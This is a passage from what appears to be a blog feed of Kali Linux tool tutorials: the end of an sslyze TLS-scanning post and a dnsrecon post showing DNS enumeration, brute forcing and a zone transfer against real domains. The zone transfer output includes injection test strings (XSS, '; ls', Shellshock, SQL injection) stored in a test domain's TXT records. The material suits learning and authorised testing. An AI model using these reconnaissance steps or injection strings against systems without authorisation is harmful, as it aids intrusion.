--http_get          Option - For each cipher suite, sends an HTTP GET
                    request after completing the SSL handshake and returns
                    the HTTP status code.
--hide_rejected_ciphers
                    Option - Hides the (usually long) list of cipher
                    suites that were rejected by the server(s).
</code></pre>

<p>  PluginChromeSha1Deprecation:</p>

<pre><code>--chrome_sha1       Determines if the server will be affected by Google
                    Chrome's SHA-1 deprecation plans. See
                    http://googleonlinesecurity.blogspot.com/2014/09
                    /gradually-sunsetting-sha-1.html for more information
</code></pre>

<p>  PluginSessionRenegotiation:</p>

<pre><code>--reneg             Tests the server(s) for client-initiated renegotiation
                    and secure renegotiation support.
</code></pre>

<p>  PluginHeartbleed:</p>

<pre><code>--heartbleed        Tests the server(s) for the OpenSSL Heartbleed
                    vulnerability (experimental).
</code></pre>

<p>  PluginCertInfo:</p>

<pre><code>--certinfo=CERTINFO
                    Verifies the validity of the server(s) certificate(s)
                    against various trust stores, checks for support for
                    OCSP stapling, and prints relevant fields of the
                    certificate. CERTINFO should be 'basic' or 'full'.
--ca_file=CA_FILE   Local Certificate Authority file (in PEM format), to
                    verify the validity of the server(s) certificate(s)
                    against.
</code></pre>

<p>  PluginCompression:</p>

<pre><code>--compression       Tests the server(s) for Zlib compression support.
</code></pre>

<p>  PluginHSTS:</p>

<pre><code>--hsts              Checks support for HTTP Strict Transport Security
                    (HSTS) by collecting any Strict-Transport-Security
                    field present in the HTTP response sent back by the
                    server(s).
</code></pre>

<p>  PluginSessionResumption:</p>

<pre><code>Analyzes the target server's SSL session resumption capabilities.

--resum             Tests the server(s) for session resumption support
                    using session IDs and TLS session tickets (RFC 5077).
--resum_rate        Performs 100 session resumptions with the server(s),
                    in order to estimate the session resumption rate.
</code></pre>

<p>```</p>

<h2>sslyze usage</h2>

<p>```
sslyze &mdash;regular bugcrowd.com</p>

<p> AVAILABLE PLUGINS</p>

<hr />

<p>  PluginSessionResumption
  PluginCompression
  PluginSessionRenegotiation
  PluginChromeSha1Deprecation
  PluginHSTS
  PluginHeartbleed
  PluginOpenSSLCipherSuites
  PluginCertInfo</p>

<p> CHECKING HOST(S) AVAILABILITY</p>

<hr />

<p>   bugcrowd.com:443                    => 104.20.4.239:443</p>

<p> SCAN RESULTS FOR BUGCROWD.COM:443 &ndash; 104.20.4.239:443</p>

<hr />

<ul>
<li><p>Deflate Compression:
  OK &ndash; Compression disabled</p></li>
<li><p>Session Renegotiation:
  Client-initiated Renegotiations:   OK &ndash; Rejected
  Secure Renegotiation:              OK &ndash; Supported</p></li>
<li><p>OpenSSL Heartbleed:
  OK &ndash; Not vulnerable to Heartbleed</p></li>
<li><p>Session Resumption:
  With Session IDs:                  OK &ndash; Supported (5 successful, 0 failed, 0 errors, 5 total attempts).
  With TLS Session Tickets:          OK &ndash; Supported</p></li>
<li><p>SSLV2 Cipher Suites:
  Server rejected all cipher suites.</p></li>
<li><p>Certificate &ndash; Content:
  SHA1 Fingerprint:                  db65dbb15a1819ad4692c47cfc0bc966beb6e44f
  Common Name:                       bugcrowd.com
  Issuer:                            DigiCert SHA2 Extended Validation Server CA
  Serial Number:                     075FE475034104F4909DDD4B5CD8C1AC
  Not Before:                        Oct 10 00:00:00 2015 GMT
  Not After:                         Oct 13 12:00:00 2017 GMT
  Signature Algorithm:               sha256WithRSAEncryption
  Public Key Algorithm:              rsaEncryption
  Key Size:                          2048 bit
  Exponent:                          65537 (0x10001)
  X509v3 Subject Alternative Name:   {&lsquo;DNS&rsquo;: [&lsquo;bugcrowd.com&rsquo;, &lsquo;forum.bugcrowd.com&rsquo;, &lsquo;blog.bugcrowd.com&rsquo;, &lsquo;docs.bugcrowd.com&rsquo;, &lsquo;tracker.bugcrowd.com&rsquo;]}</p></li>
<li><p>Certificate &ndash; Trust:
  Hostname Validation:               OK &ndash; Subject Alternative Name matches
  Google CA Store (09/2015):         OK &ndash; Certificate is trusted
  Java 6 CA Store (Update 65):       OK &ndash; Certificate is trusted
  Microsoft CA Store (09/2015):      OK &ndash; Certificate is trusted
  Mozilla NSS CA Store (09/2015):    OK &ndash; Certificate is trusted
  Apple CA Store (OS X 10.10.5):     OK &ndash; Certificate is trusted
  Certificate Chain Received:        [&lsquo;bugcrowd.com&rsquo;, &lsquo;DigiCert SHA2 Extended Validation Server CA&rsquo;]</p></li>
<li><p>Certificate &ndash; OCSP Stapling:
  OCSP Response Status:              successful
  Validation w/ Mozilla&rsquo;s CA Store:  OK &ndash; Response is trusted
  Responder Id:                      3DD350A5D6A0ADEEF34A600A65D321D4F8F8D60F
  Cert Status:                       good
  Cert Serial Number:                075FE475034104F4909DDD4B5CD8C1AC
  This Update:                       Jul 12 12:10:00 2017 GMT
  Next Update:                       Jul 19 11:25:00 2017 GMT</p></li>
<li><p>TLSV1_2 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA384       ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES256-GCM-SHA384   ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA256                 &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-GCM-SHA384             &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA256       ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA256                 &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-GCM-SHA256             &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>TLSV1_1 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>TLSV1 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             DES-CBC3-SHA                  &ndash;              112 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>SSLV3 Cipher Suites:
  Server rejected all cipher suites.</p></li>
</ul>


<p> SCAN COMPLETED IN 1.71 S</p>

<hr />

<p>```</p>

<p>```</p>

<hr />

<p>/ Noise proves nothing. Often a hen who \
| has merely laid an egg cackles as if  |
| she laid an asteroid.                 |
|                                       |
\ &mdash; Mark Twain                         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsrecon - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools/"/>
    <updated>2017-07-12T14:41:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: perform thorough DNS enumeration and subdomain bruteforcing on a target. dnsrecon is true to its name, it&rsquo;s written in Python, and judging from the number of stars on its Github repository, it&rsquo;s a much more popular choice than the other candidates in Kali&rsquo;s DNS section.</p>

<p>Homepage: <a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a></p>

<!-- more -->


<h2>dnsrecon description</h2>

<blockquote><p>This script provides the ability to perform:</p>

<p>Check all NS Records for Zone Transfers.</p>

<p>Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).</p>

<p>Perform common SRV Record Enumeration.</p>

<p>Top Level Domain (TLD) Expansion.</p>

<p>Check for Wildcard Resolution.</p>

<p>Brute Force subdomain and host A and AAAA records given a domain and a wordlist.</p>

<p>Perform a PTR Record lookup for a given IP Range or CIDR.</p>

<p>Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to
check.</p>

<p>Enumerate Common mDNS records in the Local Network</p>

<p>Enumerate Hosts and Subdomains using Google</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html">http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html</a></p>

<h2>dnsrecon options</h2>

<p>```
Version: 0.8.10
Usage: dnsrecon.py <options></p>

<p>Options:
   -h, &mdash;help                   Show this help message and exit.
   -d, &mdash;domain      <domain>   Target domain.
   -r, &mdash;range       <range>    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
   -n, &mdash;name_server <name>     Domain server to use. If none is given, the SOA of the target will be used.
   -D, &mdash;dictionary  <file>     Dictionary file of subdomain and hostnames to use for brute force.
   -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined</p>

<pre><code>                            IP address when saving records.
</code></pre>

<p>   -t, &mdash;type        <types>    Type of enumeration to perform:</p>

<pre><code>                            std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
                            rvl       Reverse lookup of a given CIDR or IP range.
                            brt       Brute force domains and hosts using a given dictionary.
                            srv       SRV records.
                            axfr      Test all NS servers for a zone transfer.
                            goo       Perform Google search for subdomains and hosts.
                            snoop     Perform cache snooping against all NS servers for a given domain, testing
                                      all with file containing the domains, file given with -D option.
                            tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
                            zonewalk  Perform a DNSSEC zone walk using NSEC records.
</code></pre>

<p>   -a                           Perform AXFR with standard enumeration.
   -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
   -g                           Perform Google enumeration with standard enumeration.
   -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through</p>

<pre><code>                            Whois when doing a standard enumeration.
</code></pre>

<p>   -z                           Performs a DNSSEC zone walk with standard enumeration.
   &mdash;threads         <number>   Number of threads to use in reverse lookups, forward lookups, brute force and SRV</p>

<pre><code>                            record enumeration.
</code></pre>

<p>   &mdash;lifetime        <number>   Time to wait for a server to response to a query.
   &mdash;db              <file>     SQLite 3 file to save found records.
   &mdash;xml             <file>     XML file to save found records.
   &mdash;iw                         Continue brute forcing a domain even if a wildcard records are discovered.
   -c, &mdash;csv         <file>     Comma separated value file.
   -j, &mdash;json        <file>     JSON file.
   -v                           Show attempts in the brute force modes.
```</p>

<h2>dnsrecon usage</h2>

<ul>
<li>general enumeration</li>
</ul>


<p><code>
dnsrecon -d asterisk.org
[*] Performing General Enumeration of Domain: asterisk.org
[-] DNSSEC is not configured for asterisk.org
[*]      SOA ns.digium.com 216.207.245.18
[*]      NS nsx3.digium.com 166.78.177.30
[*]      Bind Version for 166.78.177.30 9.8.4-rpz2+rl005.12-P1
[*]      NS nsx2.digium.com 216.207.245.19
[*]      Bind Version for 216.207.245.19 9.8.1-P1
[*]      NS nsx1.digium.com 216.207.245.18
[*]      Bind Version for 216.207.245.18 9.8.1-P1
[*]      MX mail.digium.com 216.207.245.2
[*]      A asterisk.org 216.207.245.25
[*] Enumerating SRV Records
[*]      SRV _sip._udp.asterisk.org sip.asterisk.org 204.91.156.60 5060 0
[*] 1 Records Found
</code></p>

<p>For this example I selected a site that would also have SRV records. These records help with identifying certain services, in this case SIP for VoIP. Here you can see SIP being used on port 5060 on the host with the address 204.91.156.60.</p>

<ul>
<li>perform Google search enumeration</li>
</ul>


<p><code>
dnsrecon -d uber.com -g
[*] Performing General Enumeration of Domain: uber.com
[-] DNSSEC is not configured for uber.com
[*]      SOA pdns80.ultradns.com 156.154.64.80
[*]      NS pdns80.ultradns.net 156.154.65.80
[*]      Bind Version for 156.154.65.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.net 2610:a1:1014::74
[*]      NS pdns80.ultradns.biz 156.154.66.80
[*]      Bind Version for 156.154.66.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.biz 2610:a1:1015::74
[*]      NS pdns80.ultradns.org 156.154.67.80
[*]      Bind Version for 156.154.67.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.org 2001:502:4612::74
[*]      NS pdns80.ultradns.com 156.154.64.80
[*]      Bind Version for 156.154.64.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.com 2001:502:f3ff::74
[*]      MX alt4.aspmx.l.google.com 74.125.28.27
[*]      MX alt2.aspmx.l.google.com 74.125.200.26
[*]      MX alt3.aspmx.l.google.com 74.125.23.26
[*]      MX alt1.aspmx.l.google.com 64.233.161.27
[*]      MX aspmx.l.google.com 64.233.167.26
[*]      MX alt4.aspmx.l.google.com 2607:f8b0:400e:c04::1a
[*]      MX alt2.aspmx.l.google.com 2404:6800:4003:c00::1b
[*]      MX alt3.aspmx.l.google.com 2404:6800:4008:c02::1a
[*]      MX alt1.aspmx.l.google.com 2a00:1450:4010:c01::1b
[*]      MX aspmx.l.google.com 2a00:1450:400c:c0c::1b
[*]      A uber.com 104.36.192.133
[*]      A uber.com 104.36.192.221
[*]      A uber.com 104.36.192.183
[*]      A uber.com 104.36.192.132
[*]      A uber.com 104.36.192.135
[*]      A uber.com 104.36.192.220
[*]      A uber.com 104.36.192.182
[*]      TXT uber.com v=spf1 include:uber.com._nspf.vali.email include:%{i}._ip.%{h}._ehlo.%{d}._spf.vali.email ~all
[*]      TXT uber.com google-site-verification=pO8Bhyhw0N0939yKp6cQICCpvY--sebhQKWGviAkuLM
[*]      TXT uber.com docusign=635f0402-4f58-42de-8e07-e1da6d8a971a
[*] Enumerating SRV Records
[*]      SRV _kerberos._udp.uber.com kerberos.uber.com 10.6.0.74 88 0
[*]      SRV _kpasswd._udp.uber.com kerberos.uber.com 10.6.0.74 464 0
[*] 2 Records Found
[*] Performing Google Search Enumeration
[*]      CNAME www.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME help.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME ride.uber.com d3b8kpte4epqc9.cloudfront.net
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.6
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.61
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.99
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.205
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.188
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.243
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.77
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.181
[*]      CNAME bonjour.uber.com frontends-geo.uber.com
[*]      CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
[*]      CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
[*]      A frontends-dca1.uber.com 104.36.194.234
[*]      A frontends-dca1.uber.com 104.36.194.160
[*]      A frontends-dca1.uber.com 104.36.194.133
[*]      A frontends-dca1.uber.com 104.36.194.131
[*]      CNAME accessibility.uber.com uberpolicy.wpengine.com
[*]      A uberpolicy.wpengine.com 35.184.61.224
[*]      CNAME drive.uber.com uberdrive.wpengine.com
[*]      A uberdrive.wpengine.com 35.184.61.224
[*]      CNAME central.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME dial.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME developer.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME t.uber.com ghs.google.com
[*]      CNAME ghs.google.com ghs.l.google.com
[*]      A ghs.l.google.com 172.217.16.179
[*]      CNAME t.uber.com ghs.google.com
[*]      CNAME ghs.google.com ghs.l.google.com
[*]      AAAA ghs.l.google.com 2a00:1450:4001:817::2013
[*]      CNAME newsroom.uber.com ubernewblog.wpengine.com
[*]      A ubernewblog.wpengine.com 35.184.61.224
[*]      CNAME rush.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME join.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A pages.et.uber.com 198.245.92.62
[*]      CNAME get.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME freight.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME eng.uber.com ubereng.wpengine.com
[*]      A ubereng.wpengine.com 35.184.61.224
[*]      CNAME movement.uber.com frontends-geo.uber.com
[*]      CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
[*]      CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
[*]      A frontends-dca1.uber.com 104.36.194.234
[*]      A frontends-dca1.uber.com 104.36.194.160
[*]      A frontends-dca1.uber.com 104.36.194.131
[*]      A frontends-dca1.uber.com 104.36.194.133
[*]      CNAME m.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*] 98 Records Found
</code></p>

<ul>
<li>pull SRV records of domain</li>
</ul>


<p><code>
dnsrecon -d cisco.com -t srv
[*] Enumerating Common SRV Records against cisco.com
[*]      SRV _sip._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
[*]      SRV _sips._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5061 10
[*]      SRV _h323ls._udp.cisco.com vcsgw.cisco.com 173.36.224.91 1719 10
[*]      SRV _sip._udp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
[*]      SRV _h323cs._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 1720 10
[*]      SRV _xmpp-client._tcp.cisco.com isj3cmx.webexconnect.com 66.163.36.181 5222 1
[*]      SRV _xmpp-server._tcp.cisco.com isj3jxf.webexconnect.com 66.163.36.186 5269 1
[*] 7 Records Found
</code></p>

<ul>
<li>domain bruteforcing</li>
</ul>


<p><code>
dnsrecon -D /usr/share/wordlists/dnsmap.txt -t brt -d line.me
[*] Performing host and subdomain brute force against line.me
[*]      A ads.line.me 203.104.153.62
[*]      A agp.line.me 203.104.153.74
[*]      CNAME api.line.me api.line.me.akadns.net
[*]      CNAME api.line.me.akadns.net im.api.line.me.edgekey.net
[*]      CNAME im.api.line.me.edgekey.net e1102.a1.akamaiedge.net
[*]      A e1102.a1.akamaiedge.net 2.17.116.42
[*]      A biz.line.me 125.6.149.168
[...]
</code></p>

<ul>
<li>reverse lookup</li>
</ul>


<p><code>
dnsrecon -d nmap.org -w
[...]
[*] Performing Whois lookup against records found.
[*] The following IP Ranges where found:
[*]      0) 162.158.0.0-162.159.255.255 Cloudflare, Inc.
[*]      1) 74.125.0.0-74.125.255.255 Google Inc.
[*]      2) 64.233.160.0-64.233.191.255 Google Inc.
[*]      3) 45.33.0.0-45.33.127.255 Linode
[*] What Range do you wish to do a Revers Lookup for?
[*] number, comma separated list, a for all or n for none
3
[*] Linode
[*] Performing Reverse Lookup of range 45.33.0.0-45.33.127.255
[*] Performing Reverse Lookup from 45.33.0.0 to 45.33.127.255
[*]      PTR li954-9.members.linode.com 45.33.0.9
[*]      PTR li954-4.members.linode.com 45.33.0.4
[*]      PTR gw-li954.linode.com 45.33.0.1
[*]      PTR li954-7.members.linode.com 45.33.0.7
[*]      PTR cloud521.configrapp.com 45.33.0.8
[*]      PTR mr2.linode.rbkmoney.net 45.33.0.10
[*]      PTR li954-5.members.linode.com 45.33.0.5
[*]      PTR rqdq.net 45.33.0.6
[*]      PTR li954-12.members.linode.com 45.33.0.12
[...]
</code></p>

<ul>
<li>working zone transfer</li>
</ul>


<p><a href="https://digi.ninja/projects/zonetransferme.php">Robin Wood</a> has been nice enough to register a domain that allows zone transfers for testing purposes. It&rsquo;s called zonetransfer.me, and here we&rsquo;ll look at partial output from one of the name servers:</p>

<p><code>
dnsrecon -d zonetransfer.me -a
[*] Performing General Enumeration of Domain: zonetransfer.me
[*] Checking for Zone Transfer for zonetransfer.me name servers
[*] Resolving SOA Record
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*] Resolving NS Records
[*] NS Servers found:
[*]     NS nsztm1.digi.ninja 81.4.108.41
[*]     NS nsztm2.digi.ninja 167.88.42.94
[*] Removing any duplicate NS server IP Addresses...
[*]  
[*] Trying NS server 167.88.42.94
[-] Zone Transfer Failed for 167.88.42.94!
[-] Port 53 TCP is being filtered
[*]  
[*] Trying NS server 81.4.108.41
[*] 81.4.108.41 Has port 53 TCP Open
[*] Zone Transfer was successful!!
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm2.digi.ninja 167.88.42.94
[*]      NS intns1.zonetransfer.me 167.88.42.94
[*]      NS intns2.zonetransfer.me 167.88.42.94
[*]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
[*]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
[*]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
[*]      TXT AbCdEfG
[*]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
[*]      TXT ; ls
[*]      TXT () { :]}; echo ShellShocked
[*]      TXT ' or 1=1 --
[*]      TXT Robin Wood
[*]      PTR www.zonetransfer.me 217.147.177.157
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A @.zonetransfer.me 217.147.177.157
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
[*]      SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
[*]      HINFO Casio fx-700G Windows XP
[*]      RP robin robinwood
[*]      AFSDB 1 asfdbbox
[*]      AFSDB 1 asfdbbox
[*]      LOC 53 20 56.558 N 1 38 33.526 W 0.00m
[*]      NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
[*]      NAPTR P 1 1  email.zonetransfer.me E2U+email
[*]      DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
